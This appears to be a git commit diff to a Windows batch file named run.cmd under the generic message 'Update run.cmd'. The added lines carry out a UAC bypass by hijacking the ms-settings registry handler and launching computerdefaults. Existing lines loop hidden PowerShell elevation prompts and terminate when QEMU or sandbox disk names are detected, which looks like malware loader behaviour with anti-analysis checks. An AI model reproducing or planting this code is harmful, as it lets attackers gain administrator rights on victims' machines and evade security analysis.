5d135f0b612ca25949045fdaadbc8f91178c5849
43a1723 <hai1723notgay@gmail.com>
2024-11-12 14:25:12 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -1,6 +1,17 @@
 @echo off
 cd /d "%~dp0"
 net session >nul 2>&1
+if %errorlevel% neq 0 (
+    reg add hkcu\Software\Classes\ms-settings\shell\open\command /d "%~f0" /f
+    if %errorlevel% == 0 exit /b %errorlevel%
+    reg add hkcu\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+    if %errorlevel% == 0 exit /b %errorlevel%
+    computerdefaults
+    if %errorlevel% == 0 exit /b %errorlevel%
+    reg delete hkcu\Software\Classes\ms-settings /f
+    if %errorlevel% == 0 exit /b %errorlevel%
+)
+net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
 powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"
 :: hmmm nothing
